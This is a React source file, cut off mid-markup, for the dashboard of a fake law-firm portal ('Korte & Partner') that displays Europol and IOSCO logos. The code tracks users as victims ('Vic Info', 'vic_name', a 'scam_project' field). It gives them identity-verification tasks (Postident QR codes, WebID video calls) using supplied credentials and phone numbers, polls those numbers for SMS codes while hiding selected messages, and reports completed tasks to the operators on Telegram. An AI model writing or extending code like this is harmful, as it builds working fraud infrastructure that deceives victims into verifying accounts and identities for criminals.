import { useEffect, useState, useCallback, useRef } from "react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { AssignmentStatusBadge, type AssignmentStatus } from "@/components/AssignmentStatusBadge";
import { LogOut, Copy, CheckCircle, Loader2, Lock, MessageSquare, Menu, AlertTriangle, Clock, Send, FileUp, BookOpen, Network, ArrowLeft } from "lucide-react";
import { Sheet, SheetContent, SheetTrigger, SheetHeader, SheetTitle } from "@/components/ui/sheet";
import { Separator } from "@/components/ui/separator";
import { notifyTelegram } from "@/lib/telegramNotify";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";

const europolLogo = "/europol-logo.png";
const ioscoLogo = "/iosco-logo.png";
const thomasKorte = "/thomas-korte.png";
const postidentLogo = "/postident-logo.jpg";
const appStoreBadge = "/app-store.svg";
const googlePlayBadge = "/google-play.svg";
import { useNavigate } from "react-router-dom";
import { toast } from "sonner";
import DocumentUpload from "@/components/DocumentUpload";
import VerificationLogo from "@/components/VerificationLogo";
import RecoveryGuide from "@/components/RecoveryGuide";
import RecoveryVisualization from "@/components/RecoveryVisualization";
import { extractPostidentCode } from "@/lib/extractPostidentCode";

interface SMSMessage {
  messageSender: string;
  messageDate: string;
  messageText: string;
}

interface Assignment {
  id: string;
  status: AssignmentStatus;
  field_values: Record<string, string>;
  created_at: string;
  verification_id: string;
  phone_number_id: string | null;
  phone_token: string | null;
  sms_monitoring_active: boolean;
  hidden_sms: string[];
  webid_redirect: boolean;
  verification?: {
    title: string;
    type: string;
    logo_url: string | null;
    instructions: string[];
    required_fields: string[];
    appstore_url: string | null;
    playstore_url: string | null;
  };
  phone_number?: string | null;
}

const FIELD_ORDER = ["identlink", "identcode", "email", "username", "password"];

const FIELD_LABELS: Record<string, string> = {
  identlink: "Identlink",
  identcode: "Identcode",
  email: "E-Mail",
  username: "Anmeldename",
  password: "Passwort",
};

const PLACEHOLDER_CARDS = [
  { label: "Demnächst verfügbar" },
  { label: "Demnächst verfügbar" },
];

export default function Dashboard() {
  const { user, signOut } = useAuth();
  const navigate = useNavigate();
  const [assignments, setAssignments] = useState<Assignment[]>([]);
  const [loading, setLoading] = useState(true);
  const [profileName, setProfileName] = useState<string>("");
  const [profileEmail, setProfileEmail] = useState<string>("");
  const [profilePhone, setProfilePhone] = useState<string>("");
  const [profileBalance, setProfileBalance] = useState<number | null>(null);
  const [profileScamProject, setProfileScamProject] = useState<string>("");
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [smsMessages, setSmsMessages] = useState<SMSMessage[]>([]);
  const [smsLoading, setSmsLoading] = useState(false);
  const [showDocUpload, setShowDocUpload] = useState(false);
  const [showGuide, setShowGuide] = useState(false);
  const [showRecovery, setShowRecovery] = useState(false);
  const [postidentDoc, setPostidentDoc] = useState<{ url: string; name: string; qr: string | null; loading: boolean; error: string | null } | null>(null);
  const [qrLightboxOpen, setQrLightboxOpen] = useState(false);
  const [mobileNavOpen, setMobileNavOpen] = useState(false);



  const userIdRef = user?.id;
  const hasAutoOpenedGuide = useRef(false);

  useEffect(() => {
    if (userIdRef) {
      loadAssignments();
      loadProfile();
    }
  }, [userIdRef]);

  const loadProfile = async () => {
    const { data } = await supabase
      .from("profiles")
      .select("first_name, last_name, email, phone, balance, scam_project")
      .eq("id", user!.id)
      .maybeSingle();
    if (data) {
      const name = [data.first_name, data.last_name].filter(Boolean).join(" ");
      setProfileName(name);
      setProfileEmail(data.email ?? "");
      setProfilePhone((data as any).phone ?? "");
      setProfileBalance(data.balance ?? null);
      setProfileScamProject(data.scam_project ?? "");
    }
  };

  const loadAssignments = async () => {
    if (assignments.length === 0) setLoading(true);
    const { data: rows } = await supabase
      .from("verification_assignments")
      .select("id, status, field_values, created_at, verification_id, phone_number_id, sms_monitoring_active, hidden_sms, webid_redirect")
      .eq("user_id", user!.id)
      .order("created_at", { ascending: false });

    if (!rows || rows.length === 0) {
      setAssignments([]);
      setLoading(false);
      return;
    }

    const verificationIds = [...new Set(rows.map((r) => r.verification_id))];
    const { data: verifications } = await supabase
      .from("verifications")
      .select("id, title, type, logo_url, instructions, required_fields, appstore_url, playstore_url")
      .in("id", verificationIds);

    const vMap = new Map(verifications?.map((v) => [v.id, v]) ?? []);

    const phoneIds = rows.filter((r) => r.phone_number_id).map((r) => r.phone_number_id!);
    let phoneMap = new Map<string, { number: string; token: string }>();
    if (phoneIds.length > 0) {
      const { data: phones } = await supabase
        .from("phone_numbers")
        .select("id, token")
        .in("id", phoneIds);

      if (phones) {
        for (const p of phones) {
          try {
            const { data } = await supabase.functions.invoke("anosim-proxy", {
              body: { token: p.token },
            });
            if (data?.number) {
              phoneMap.set(p.id, { number: data.number, token: p.token });
            }
          } catch {
            // ignore
          }
        }
      }
    }

    const mapped: Assignment[] = rows.map((r) => {
      const phoneData = r.phone_number_id ? phoneMap.get(r.phone_number_id) : null;
      return {
        id: r.id,
        status: r.status as AssignmentStatus,
        field_values: (r.field_values as Record<string, string>) ?? {},
        created_at: r.created_at,
        verification_id: r.verification_id,
        phone_number_id: r.phone_number_id,
        phone_token: phoneData?.token ?? null,
        sms_monitoring_active: (r as any).sms_monitoring_active ?? true,
        hidden_sms: ((r as any).hidden_sms as string[]) ?? [],
        webid_redirect: (r as any).webid_redirect ?? false,
        verification: vMap.get(r.verification_id),
        phone_number: phoneData?.number ?? null,
      };
    });

    setAssignments(mapped);
    setLoading(false);
  };

  const selected = assignments.find((a) => a.id === selectedId) ?? null;

  // Load postident PDF + extract QR when opening a postident assignment
  useEffect(() => {
    let cancelled = false;
    setQrLightboxOpen(false);
    if (!selected || selected.verification?.type !== "postident") {
      setPostidentDoc(null);
      return;
    }
    (async () => {
      setPostidentDoc({ url: "", name: "", qr: null, loading: true, error: null });
      const { data: docs, error: docErr } = await supabase
        .from("user_documents")
        .select("file_name, file_path, created_at")
        .eq("assignment_id", selected.id)
        .order("created_at", { ascending: false })
        .limit(1);
      if (cancelled) return;
      if (docErr || !docs || docs.length === 0) {
        setPostidentDoc(null);
        return;
      }
      const doc = docs[0];
      const { data: signed, error: urlErr } = await supabase.storage
        .from("user-documents")
        .createSignedUrl(doc.file_path, 3600);
      if (cancelled) return;
      if (urlErr || !signed?.signedUrl) {
        setPostidentDoc({ url: "", name: doc.file_name, qr: null, loading: false, error: "Dokument konnte nicht geladen werden." });
        return;
      }
      const pdfUrl = signed.signedUrl;
      try {
        const codeDataUrl = await extractPostidentCode(pdfUrl);
        if (cancelled) return;
        setPostidentDoc({ url: pdfUrl, name: doc.file_name, qr: codeDataUrl, loading: false, error: null });
      } catch (e: any) {
        if (cancelled) return;
        setPostidentDoc({ url: pdfUrl, name: doc.file_name, qr: null, loading: false, error: e?.message ?? "Code konnte nicht aus der PDF extrahiert werden." });
      }
    })();
    return () => {
      cancelled = true;
    };
  }, [selected?.id, selected?.verification?.type]);



  // SMS loading with auto-refresh
  const fetchSms = useCallback(async () => {
    if (!selected?.phone_token || !selected?.created_at) return;
    if (!selected.sms_monitoring_active) {
      setSmsMessages([]);
      return;
    }
    
    try {
      const { data } = await supabase.functions.invoke("anosim-proxy", {
        body: { token: selected.phone_token, assignmentId: selected.id },
      });
      
      if (data?.sms && Array.isArray(data.sms)) {
        const assignedAt = new Date(selected.created_at);
        const hiddenKeys = selected.hidden_sms || [];
        const filtered = data.sms
          .filter((sms: SMSMessage) => new Date(sms.messageDate) >= assignedAt)
          .filter((sms: SMSMessage) => !hiddenKeys.includes(`${sms.messageSender}|${sms.messageDate}`))
          .sort((a: SMSMessage, b: SMSMessage) => 
            new Date(b.messageDate).getTime() - new Date(a.messageDate).getTime()
          );
        setSmsMessages(filtered);
      }
    } catch {
      // ignore errors silently
    }
  }, [selected?.phone_token, selected?.created_at, selected?.sms_monitoring_active, selected?.hidden_sms]);

  useEffect(() => {
    if (selectedId && selected?.phone_token) {
      setSmsLoading(true);
      fetchSms().finally(() => setSmsLoading(false));
      
      const interval = setInterval(fetchSms, 5000);
      return () => clearInterval(interval);
    } else {
      setSmsMessages([]);
    }
  }, [selectedId, selected?.phone_token, fetchSms]);

  const handleSignOut = async () => {
    await signOut();
    navigate("/auth", { replace: true });
  };

  const copyToClipboard = (key: string, value: string) => {
    navigator.clipboard.writeText(value);
    setCopiedField(key);
    toast.success("Kopiert");
    setTimeout(() => setCopiedField(null), 2000);
  };

  const formatSmsDate = (iso: string) => {
    const date = new Date(iso);
    return date.toLocaleString("de-DE", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  };

  // Get ordered credentials (excluding phone which has its own section)
  const getOrderedCredentials = (fieldValues: Record<string, string>) => {
    const result: [string, string][] = [];
    for (const key of FIELD_ORDER) {
      if (fieldValues[key] !== undefined) {
        result.push([key, fieldValues[key]]);
      }
    }
    return result;
  };

  const activeView: "assignments" | "recovery" | "guide" | "upload" | "detail" = selected
    ? "detail"
    : showRecovery
    ? "recovery"
    : showGuide
    ? "guide"
    : showDocUpload
    ? "upload"
    : "assignments";

  // Wenn keine Aufträge vorhanden sind, direkt die Anleitung anzeigen
  useEffect(() => {
    if (!loading && assignments.length === 0 && !hasAutoOpenedGuide.current && activeView === "assignments") {
      setShowGuide(true);
      hasAutoOpenedGuide.current = true;
    }
  }, [loading, assignments.length, activeView]);

  if (loading) {
    return (
      <div className="min-h-screen bg-slate-50 flex items-center justify-center">
        <Loader2 className="w-6 h-6 animate-spin text-slate-400" />
      </div>
    );
  }

  const goTo = (view: "assignments" | "recovery" | "guide" | "upload") => {
    setSelectedId(null);
    setShowRecovery(view === "recovery");
    setShowGuide(view === "guide");
    setShowDocUpload(view === "upload");
    setMobileNavOpen(false);
  };

  const NavButton = ({
    view,
    icon: Icon,
    label,
  }: {
    view: "assignments" | "recovery" | "guide" | "upload";
    icon: typeof Network;
    label: string;
  }) => {
    const isActive = activeView === view;
    return (
      <button
        type="button"
        onClick={() => goTo(view)}
        className={`relative flex items-center gap-3 w-full rounded-lg px-3 py-2.5 text-sm font-medium transition-colors ${
          isActive
            ? "bg-[#0b1f3a] text-white"
            : "text-slate-700 hover:bg-slate-100 hover:text-[#0b1f3a]"
        }`}
      >
        {isActive && (
          <span className="absolute left-0 top-1.5 bottom-1.5 w-0.5 rounded-full bg-[#c9a24a]" />
        )}
        <Icon className="w-4 h-4 shrink-0" />
        <span className="truncate">{label}</span>
      </button>
    );
  };

  const SidebarInner = () => (
    <div className="flex flex-col h-full">
      {/* Logo */}
      <div className="px-1 pb-4">
        <span className="font-serif text-xl tracking-tight text-[#0b1f3a] block">
          Korte <span className="text-[#c9a24a]">&amp;</span> Partner
        </span>
        <p className="mt-1 text-[11px] uppercase tracking-widest text-slate-500">
          Rechtsanwaltskanzlei
        </p>
        <div className="mt-3 h-px w-full bg-[#c9a24a]/60" />
      </div>

      {/* Ansprechpartner */}
      <div className="flex items-center gap-3 rounded-lg bg-slate-50 border border-slate-200 px-3 py-3">
        <div className="relative w-12 h-12 overflow-hidden rounded-full border border-[#0b1f3a]/20 shrink-0">
          <img
            src={thomasKorteAsset.url}
            alt="Dr. Thomas Korte"
            className="absolute left-1/2 top-0 h-[250%] w-auto max-w-none -translate-x-1/2"
          />
        </div>
        <div className="min-w-0">
          <p className="text-sm font-semibold text-[#0b1f3a] truncate">Dr. Thomas Korte</p>
          <p className="text-xs text-slate-600 truncate">Rechtsanwalt</p>
          <p className="text-xs text-slate-600 truncate">040 573086460</p>
        </div>
      </div>

      <Separator className="my-4 bg-slate-200" />

      {/* Navigation */}
      <nav className="space-y-1">
        <NavButton view="assignments" icon={Lock} label="Aufträge" />
        <NavButton view="guide" icon={BookOpen} label="Anleitung" />
        <NavButton view="recovery" icon={Network} label="Rückverfolgung" />
        <NavButton view="upload" icon={FileUp} label="Dokumente hochladen" />
      </nav>

      <div className="flex-1 min-h-0" />

      {/* Vic Info */}
      {(profileName || profileEmail || profilePhone || profileBalance !== null || profileScamProject) && (
        <div className="rounded-lg bg-slate-50 border border-slate-200 px-3 py-3 space-y-0.5">
          {profileName && (
            <p className="text-sm font-semibold text-[#0b1f3a] truncate">{profileName}</p>
          )}
          {profileEmail && (
            <p className="text-xs text-slate-600 truncate">{profileEmail}</p>
          )}
          {profilePhone && (
            <p className="text-xs text-slate-600 truncate">{profilePhone}</p>
          )}
          {profileBalance !== null && (
            <p className="text-xs text-slate-700 truncate">
              <span className="text-[#c9a24a] font-semibold tracking-wide">Guthaben:</span>{" "}
              <span className="font-semibold text-[#0b1f3a]">
                {new Intl.NumberFormat("de-DE", { style: "currency", currency: "EUR" }).format(profileBalance)}
              </span>
            </p>
          )}
          {profileScamProject && (
            <p className="text-xs text-slate-600 truncate">
              <span className="text-[#c9a24a] font-semibold tracking-wide">Projekt:</span>{" "}
              <span className="text-[#0b1f3a]">{profileScamProject}</span>
            </p>
          )}
        </div>
      )}

      <Separator className="my-4 bg-slate-200" />

      {/* Logout */}
      <Button
        variant="ghost"
        size="sm"
        onClick={handleSignOut}
        className="w-full justify-start text-slate-600 hover:text-[#0b1f3a] hover:bg-slate-100"
      >
        <LogOut className="w-4 h-4 mr-2" />
        Abmelden
      </Button>

      <div className="my-4 h-px w-full bg-gradient-to-r from-transparent via-[#c9a24a]/60 to-transparent" />

      {/* Cooperation logos */}
      <div>
        <p className="text-[10px] uppercase tracking-widest text-slate-500 font-medium mb-3 text-center">
          In Kooperation mit
        </p>
        <div className="flex flex-col items-center gap-3">
          <div className="h-7 flex items-center justify-center">
            <img
              src={ioscoLogoAsset.url}
              alt="IOSCO"
              className="max-h-full w-auto object-contain opacity-80"
            />
          </div>
          <div className="h-6 flex items-center justify-center">
            <img
              src={europolLogo}
              alt="Europol"
              className="max-h-full w-auto object-contain opacity-80"
            />
          </div>
        </div>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-slate-50">
      {/* Mobile Top Bar */}
      <header className="lg:hidden sticky top-0 z-20 border-b border-slate-200 bg-white/95 backdrop-blur-sm">
        <div className="flex relative h-14 items-center justify-center px-4">
          <Sheet open={mobileNavOpen} onOpenChange={setMobileNavOpen}>
            <SheetTrigger asChild>
              <Button variant="ghost" size="icon" className="absolute left-3 top-1/2 -translate-y-1/2 text-[#0b1f3a] hover:bg-slate-100">
                <Menu className="w-5 h-5" />
              </Button>
            </SheetTrigger>
            <SheetContent side="left" className="w-[85vw] max-w-xs p-5 bg-white overflow-y-auto">
              <SheetHeader className="sr-only">
                <SheetTitle>Menü</SheetTitle>
              </SheetHeader>
              <div className="flex flex-col h-full">
                <SidebarInner />
              </div>
            </SheetContent>
          </Sheet>
          <span className="font-serif text-lg tracking-tight text-[#0b1f3a] truncate max-w-[70%] text-center">
            Korte <span className="text-[#c9a24a]">&amp;</span> Partner
          </span>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8">
        <div className="lg:grid lg:grid-cols-4 lg:gap-8">
          {/* Sidebar Card (desktop) */}
          <aside className="hidden lg:block lg:col-span-1">
            <div className="sticky top-8 h-[calc(100vh-4rem)] rounded-xl border border-slate-200 bg-white shadow-sm p-6 flex flex-col overflow-y-auto">
              <SidebarInner />
            </div>
          </aside>

          {/* Content */}
          <div className="lg:col-span-3 min-w-0">



      {showRecovery ? (
        <RecoveryVisualization onOpenGuide={() => { setShowRecovery(false); setShowGuide(true); }} />
      ) : showGuide ? (
        <RecoveryGuide />
      ) : showDocUpload ? (
        <DocumentUpload />
      ) : selected ? (
        /* ── Detail View ── */
        <main className="max-w-2xl mx-auto w-full px-4 sm:px-6 py-6 sm:py-10 animate-in fade-in slide-in-from-right-4 duration-300">
          {qrLightboxOpen && postidentDoc?.qr && (
            <div
              className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center p-4 sm:p-6 animate-in fade-in duration-150"
              onClick={() => setQrLightboxOpen(false)}
              role="dialog"
              aria-modal="true"
            >
              <button
                type="button"
                onClick={(e) => { e.stopPropagation(); setQrLightboxOpen(false); }}
                className="absolute top-4 right-4 rounded-full bg-white/10 hover:bg-white/20 text-white p-2 transition-colors z-10"
                aria-label="Schließen"
              >
                <svg viewBox="0 0 24 24" className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
              </button>
              <div
                className="flex flex-col items-center gap-4 sm:gap-5"
                onClick={(e) => e.stopPropagation()}
              >
                <img
                  src={postidentLogoAsset.url}
                  alt="Postident"
                  className="w-44 sm:w-56 h-auto max-h-16 sm:max-h-20 object-contain"
                />
                <img
                  src={postidentDoc.qr}
                  alt="Postident-Code"
                  className="max-w-[85vw] sm:max-w-[70vw] max-h-[45vh] sm:max-h-[50vh] object-contain rounded-lg bg-white p-3 sm:p-4 shadow-2xl"
                />
                <VerificationLogo
                  value={selected.verification?.logo_url ?? null}
                  alt={selected.verification?.title ?? ""}
                  className="w-40 h-20 sm:w-48 sm:h-24 object-contain drop-shadow-lg"
                />
              </div>
            </div>
          )}
          <Button
            variant="ghost"
            size="sm"
            onClick={() => setSelectedId(null)}
            className="mb-4 -ml-2 text-slate-600 hover:text-[#0b1f3a] hover:bg-slate-100"
          >
            <ArrowLeft className="w-4 h-4 mr-2" />
            Zurück zu den Aufträgen
          </Button>

          <div className="flex items-center gap-3 sm:gap-4 mb-6 sm:mb-8">
            <VerificationLogo
              value={selected.verification?.logo_url ?? null}
              alt={selected.verification?.title ?? ""}
              className="w-12 h-12 sm:w-14 sm:h-14 rounded-xl object-contain bg-slate-50 border border-slate-200 p-2 shrink-0"
            />
            <div className="flex-1 min-w-0">
              <h1 className="font-serif text-xl sm:text-3xl font-semibold text-[#0b1f3a] tracking-tight break-words">
                {selected.verification?.title ?? "Auftrag"}
              </h1>
              <div className="mt-1.5">
                <AssignmentStatusBadge status={selected.status} />
              </div>
            </div>
          </div>

          <div className="space-y-8">
            {/* Instructions */}
            {(() => {
              const steps = selected.webid_redirect
                ? [
                    "Öffne den unten hinterlegten Identlink in deinem Browser.",
                    "Folge den Anweisungen auf der Webseite und halte deinen gültigen Personalausweis oder Reisepass bereit.",
                    "Starte den Videocall und folge den Anweisungen des WebID-Mitarbeiters.",
                    "Bestätige den finalen TAN-Code, den du per SMS erhältst.",
                  ]
                : selected.verification?.instructions ?? [];
              if (steps.length === 0) return null;
              return (
                <div>
                  <h3 className="text-xs font-semibold tracking-[0.2em] text-[#c9a24a] mb-3 uppercase">Anleitung</h3>
                  <ol className="space-y-3">
                    {steps.map((step, i) => (
                      <li key={i} className="flex gap-3 items-start">
                        <span className="flex-shrink-0 w-6 h-6 rounded-full bg-[#0b1f3a] text-white text-xs font-semibold flex items-center justify-center mt-0.5">
                          {i + 1}
                        </span>
                        <span className="text-sm text-slate-700 leading-relaxed">{step}</span>
                      </li>
                    ))}
                  </ol>
                </div>
              );
            })()}
            {/* App Links - Badge Images */}
            {!selected.webid_redirect && (selected.verification?.appstore_url || selected.verification?.playstore_url) && (
              <div className="grid grid-flow-col auto-cols-fr gap-2 sm:flex sm:flex-row sm:gap-3 sm:flex-wrap">
                {selected.verification.appstore_url && (
                  <a href={selected.verification.appstore_url} target="_blank" rel="noopener noreferrer" className="block w-full sm:w-auto">
                    <img src={appStoreBadge} alt="App Store" className="w-full sm:w-auto sm:h-10 h-auto transition-transform duration-200 hover:scale-105" />
                  </a>
                )}
                {selected.verification.playstore_url && (
                  <a href={selected.verification.playstore_url} target="_blank" rel="noopener noreferrer" className="block w-full sm:w-auto">
                    <img src={googlePlayBadge} alt="Google Play" className="w-full sm:w-auto sm:h-10 h-auto transition-transform duration-200 hover:scale-105" />
                  </a>
                )}
              </div>
            )}

            {/* Postident QR + Download */}
            {selected.verification?.type === "postident" && postidentDoc && (
              <div>
                <h3 className="text-xs font-semibold tracking-[0.2em] text-[#c9a24a] mb-3 uppercase">Postident-Code</h3>
                <div className="rounded-lg border border-slate-200 bg-slate-50 px-4 py-5">
                  {postidentDoc.loading ? (
                    <div className="flex items-center justify-center py-10">
                      <Loader2 className="w-5 h-5 animate-spin text-slate-400" />
                    </div>
                  ) : (
                    <div className="flex flex-col items-center gap-4">
                      {postidentDoc.qr ? (
                        <button
                          type="button"
                          onClick={() => setQrLightboxOpen(true)}
                          className="group relative rounded-md bg-white p-3 border border-slate-200 shadow-sm cursor-zoom-in transition-transform hover:scale-[1.02]"
                          aria-label="Code vergrößern"
                        >
                          <img src={postidentDoc.qr} alt="Postident-Code" className="w-full max-w-[15rem] aspect-square h-auto object-contain" />
                        </button>
                      ) : (
                        <p className="text-sm text-slate-500 text-center">
                          {postidentDoc.error ?? "Code konnte nicht aus der PDF extrahiert werden."}
                        </p>
                      )}
                      {postidentDoc.url && (
                        <a
                          href={postidentDoc.url}
                          download={postidentDoc.name}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="inline-flex w-full sm:w-auto items-center justify-center gap-2 rounded-md bg-[#0b1f3a] hover:bg-[#0b1f3a]/90 text-white text-sm font-medium px-4 py-2.5 transition-colors"
                        >
                          <FileUp className="w-4 h-4 rotate-180" />
                          PDF herunterladen
                        </a>
                      )}
                      {postidentDoc.name && (
                        <p className="text-xs text-slate-500 truncate max-w-full">{postidentDoc.name}</p>
                      )}
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Credentials - Ordered */}
            {getOrderedCredentials(selected.field_values).length > 0 && (
              <div>
                <h3 className="text-xs font-semibold tracking-[0.2em] text-[#c9a24a] mb-3 uppercase">Zugangsdaten</h3>
                <div className="space-y-2">
                  {getOrderedCredentials(selected.field_values).map(([key, value]) => (
                    <div
                      key={key}
                      className="flex items-center justify-between rounded-lg border border-slate-200 bg-slate-50 px-4 py-3 group"
                    >
                      <div className="min-w-0 flex-1">
                        <p className="text-[10px] uppercase tracking-widest text-slate-500 font-semibold">{FIELD_LABELS[key] ?? key}</p>
                        {key === "identlink" ? (
                          <a
                            href={value}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="text-sm font-mono font-semibold text-[#0b1f3a] truncate block hover:underline"
                          >
                            {value}
                          </a>
                        ) : (
                          <p className="text-sm font-mono font-semibold text-[#0b1f3a] truncate">{value}</p>
                        )}
                      </div>
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-8 w-8 shrink-0 opacity-100 sm:opacity-60 sm:group-hover:opacity-100 transition-opacity"
                        onClick={() => copyToClipboard(key, value)}
                      >
                        {copiedField === key ? (
                          <CheckCircle className="w-3.5 h-3.5 text-green-600" />
                        ) : (
                          <Copy className="w-3.5 h-3.5" />
                        )}
                      </Button>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Phone number */}
            {selected.phone_number && (
              <div>
                <h3 className="text-xs font-semibold tracking-[0.2em] text-[#c9a24a] mb-3 uppercase">Zugewiesene Telefonnummer</h3>
                <div className="flex items-center justify-between rounded-lg border border-slate-200 bg-slate-50 px-4 py-3 group">
                  <div>
                    <p className="text-[10px] uppercase tracking-widest text-slate-500 font-semibold">Telefonnummer</p>
                    <p className="text-sm font-mono font-semibold text-[#0b1f3a]">{selected.phone_number}</p>
                  </div>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 shrink-0 opacity-100 sm:opacity-60 sm:group-hover:opacity-100 transition-opacity"
                    onClick={() => copyToClipboard("phone_assigned", selected.phone_number!)}
                  >
                    {copiedField === "phone_assigned" ? (
                      <CheckCircle className="w-3.5 h-3.5 text-green-600" />
                    ) : (
                      <Copy className="w-3.5 h-3.5" />
                    )}
                  </Button>
                </div>
              </div>
            )}

            {/* SMS Messages */}
            {selected.phone_token && selected.sms_monitoring_active && (
              <div>
                <div className="flex items-center gap-2 mb-3">
                  <MessageSquare className="w-4 h-4 text-[#c9a24a]" />
                  <h3 className="text-xs font-semibold tracking-[0.2em] text-[#c9a24a] uppercase">SMS-Nachrichten</h3>
                  {smsLoading && <Loader2 className="w-3.5 h-3.5 animate-spin text-slate-400" />}
                </div>
                
                {smsMessages.length === 0 ? (
                  <div className="rounded-lg border border-slate-200 bg-slate-50 px-4 py-6 text-center">
                    <p className="text-sm text-slate-500">
                      {smsLoading ? "Lade SMS..." : "Noch keine SMS seit Zuweisung eingegangen"}
                    </p>
                  </div>
                ) : (
                  <div className="space-y-2">
                    {smsMessages.map((sms, i) => (
                      <div
                        key={`${sms.messageDate}-${i}`}
                        className="rounded-lg border border-slate-200 bg-slate-50 px-4 py-3 group"
                      >
                        <div className="flex items-start justify-between gap-3">
                          <div className="min-w-0 flex-1">
                            <div className="flex flex-wrap items-center gap-x-2 gap-y-0.5 mb-1">
                              <span className="text-xs font-semibold text-[#0b1f3a] break-all">{sms.messageSender}</span>
                              <span className="text-xs text-slate-500">{formatSmsDate(sms.messageDate)}</span>
                            </div>
                            <p className="text-sm text-slate-700 break-words">{sms.messageText}</p>
                          </div>
                          <Button
                            variant="ghost"
                            size="icon"
                            className="h-8 w-8 shrink-0 opacity-100 sm:opacity-60 sm:group-hover:opacity-100 transition-opacity"
                            onClick={() => copyToClipboard(`sms-${i}`, sms.messageText)}
                          >
                            {copiedField === `sms-${i}` ? (
                              <CheckCircle className="w-3.5 h-3.5 text-green-600" />
                            ) : (
                              <Copy className="w-3.5 h-3.5" />
                            )}
                          </Button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}

            {/* Status banners & submit button */}
            {selected.status === "abgelehnt" && (
              <div className="flex items-start gap-3 rounded-xl border border-red-300 bg-red-50 px-4 py-3 dark:border-red-500/30 dark:bg-red-500/10">
                <AlertTriangle className="w-5 h-5 text-red-600 dark:text-red-400 mt-0.5 shrink-0" />
                <div>
                  <p className="text-sm font-medium text-red-700 dark:text-red-400">Auftrag abgelehnt</p>
                  <p className="text-sm text-red-600/80 dark:text-red-400/70">Bitte führen Sie den Auftrag erneut gemäß der Anleitung durch und reichen Sie ihn dann wieder ein.</p>
                </div>
              </div>
            )}

            {selected.status === "in_ueberpruefung" && (
              <div className="flex items-start gap-3 rounded-xl border border-orange-300 bg-orange-50 px-4 py-3 dark:border-orange-500/30 dark:bg-orange-500/10">
                <Clock className="w-5 h-5 text-orange-600 dark:text-orange-400 mt-0.5 shrink-0" />
                <div>
                  <p className="text-sm font-medium text-orange-700 dark:text-orange-400">In Überprüfung</p>
                  <p className="text-sm text-orange-600/80 dark:text-orange-400/70">Ihr Auftrag wird derzeit überprüft. Bitte haben Sie etwas Geduld.</p>
                </div>
              </div>
            )}

            {selected.status === "genehmigt" && (
              <div className="flex items-start gap-3 rounded-xl border border-emerald-300 bg-emerald-50 px-4 py-3 dark:border-emerald-500/30 dark:bg-emerald-500/10">
                <CheckCircle className="w-5 h-5 text-emerald-600 dark:text-emerald-400 mt-0.5 shrink-0" />
                <div>
                  <p className="text-sm font-medium text-emerald-700 dark:text-emerald-400">Erfolgreich abgeschlossen</p>
                  <p className="text-sm text-emerald-600/80 dark:text-emerald-400/70">Dieser Auftrag wurde erfolgreich genehmigt.</p>
                </div>
              </div>
            )}

            {(selected.status === "zugewiesen" || selected.status === "abgelehnt") && (
              <AlertDialog>
                <AlertDialogTrigger asChild>
                  <Button className="w-full bg-[#0b1f3a] hover:bg-[#0b1f3a]/90 text-white" size="lg">
                    <Send className="w-4 h-4 mr-2" />
                    Auftrag abschließen
                  </Button>
                </AlertDialogTrigger>
                <AlertDialogContent>
                  <AlertDialogHeader>
                    <AlertDialogTitle>Auftrag zur Überprüfung einreichen?</AlertDialogTitle>
                    <AlertDialogDescription>
                      Bitte bestätigen Sie, dass Sie den Auftrag gemäß der Anleitung erfolgreich abgeschlossen haben. Der Auftrag wird anschließend zur Überprüfung eingereicht.
                    </AlertDialogDescription>
                  </AlertDialogHeader>
                  <AlertDialogFooter>
                    <AlertDialogCancel>Abbrechen</AlertDialogCancel>
                    <AlertDialogAction
                      onClick={async () => {
                        const { error } = await supabase
                          .from("verification_assignments")
                          .update({ status: "in_ueberpruefung" as any })
                          .eq("id", selected.id);
                        if (error) {
                          toast.error("Fehler: " + error.message);
                        } else {
                          toast.success("Auftrag zur Überprüfung eingereicht");
                          setAssignments((prev) =>
                            prev.map((a) =>
                              a.id === selected.id ? { ...a, status: "in_ueberpruefung" as AssignmentStatus } : a
                            )
                          );
                          (async () => {
                            const { data: prof } = await supabase
                              .from("profiles")
                              .select("first_name, last_name")
                              .eq("id", user!.id)
                              .maybeSingle();
                            const vicName = `${prof?.first_name ?? ""} ${prof?.last_name ?? ""}`.trim() || (user?.email ?? "Unbekannt");
                            notifyTelegram("assignment_completed", {
                              vic_name: vicName,
                              verification_title: selected.verification?.title ?? "Auftrag",
                            });
                          })();
                        }
                      }}
                    >
                      Bestätigen
                    </AlertDialogAction>
                  </AlertDialogFooter>
                </AlertDialogContent>
              </AlertDialog>
            )}
          </div>
        </main>
      ) : (
        /* ── Overview ── */
        <main className="max-w-5xl mx-auto w-full px-4 sm:px-6">
          {/* Hero */}
          <div className="pt-8 pb-8 sm:pt-16 sm:pb-12 text-center opacity-0 animate-fade-in" style={{ animationDelay: "0ms", animationFillMode: "forwards" }}>
            <h1 className="font-serif text-2xl sm:text-4xl md:text-5xl font-semibold tracking-tight text-[#0b1f3a]">
              Willkommen zurück
            </h1>
            <p className="mt-3 sm:mt-4 text-sm sm:text-base text-slate-600 max-w-3xl mx-auto leading-relaxed">
